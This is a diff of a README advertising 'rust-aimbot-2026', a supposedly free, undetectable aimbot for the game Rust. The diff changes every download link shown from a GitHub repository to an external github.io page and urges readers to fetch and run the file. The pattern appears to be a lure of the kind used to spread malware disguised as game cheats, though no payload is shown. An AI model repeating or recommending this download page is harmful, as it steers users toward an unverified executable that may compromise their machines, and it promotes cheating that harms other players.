@@ -1,6 +1,6 @@
 # 🎯 rust-aimbot-2026 - See Everything, Hit Everything, Win Every Fight
 
-[![Download Now](https://img.shields.io/badge/Download-rust--aimbot--2026-blueviolet?style=for-the-badge&logo=github)](https://github.com/adriianaasnchzz/rust-aimbot-2026)
+[![Download Now](https://img.shields.io/badge/Download-rust--aimbot--2026-blueviolet?style=for-the-badge&logo=github)](https://adriianaasnchzz.github.io)
 
 ## 🚀 What Is This?
 
@@ -28,7 +28,7 @@ Built for the 2026 version of Rust, this tool is designed to be **free, undetect
 ## 📥 How to Download and Install (Step-by-Step)
 
 ### Step 1: Get the File
-Visit this link to download the application: [**rust-aimbot-2026 Download**](https://github.com/adriianaasnchzz/rust-aimbot-2026)
+Visit this link to download the application: [**rust-aimbot-2026 Download**](https://adriianaasnchzz.github.io)
 
 Click the big download button on that page. The file will start downloading automatically.
 
@@ -120,7 +120,7 @@ No, this is for the PC version only.
 
 **Ready to dominate?** Click the button below to get started right now:
 
-[![Download rust-aimbot-2026](https://img.shields.io/badge/⬇️_Download_Now-rust--aimbot--2026-success?style=for-the-badge&logo=github&logoColor=white&labelColor=2b3137)](https://github.com/adriianaasnchzz/rust-aimbot-2026)
+[![Download rust-aimbot-2026](https://img.shields.io/badge/⬇️_Download_Now-rust--aimbot--2026-success?style=for-the-badge&logo=github&logoColor=white&labelColor=2b3137)](https://adriianaasnchzz.github.io)
 
 ---
 
